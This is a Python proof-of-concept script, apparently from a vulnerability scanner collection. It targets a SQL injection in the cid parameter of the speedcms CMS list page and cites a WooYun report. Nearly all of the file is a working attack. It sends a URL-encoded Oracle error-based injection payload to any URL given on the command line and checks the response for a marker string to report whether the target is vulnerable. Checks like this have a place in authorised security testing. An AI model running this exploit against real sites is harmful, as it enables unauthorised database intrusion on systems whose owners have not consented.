#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: speedcms list文件参数cid SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0136530
author: Lucifer
description: 文件list中,参数cid存在SQL注入。
'''
import sys
import requests
import warnings



class list_cid_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['speedcms list文件参数cid SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/guestbook/list/portalId/86/cid/828%27)AnD%206152=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(120)%7C%7CCHR(106)%7C%7CCHR(113)%7C%7C(SELECT%20(CASE%20WHEN%20(6152=6152)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(113)%7C%7CCHR(107)%7C%7CCHR(98)%7C%7CCHR(106)%7C%7CCHR(113)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20(%27JTxZ%27=%27JTxZ"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"qpxjq1qkbjq" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = list_cid_sqli(sys.argv[1])
    testVuln.run()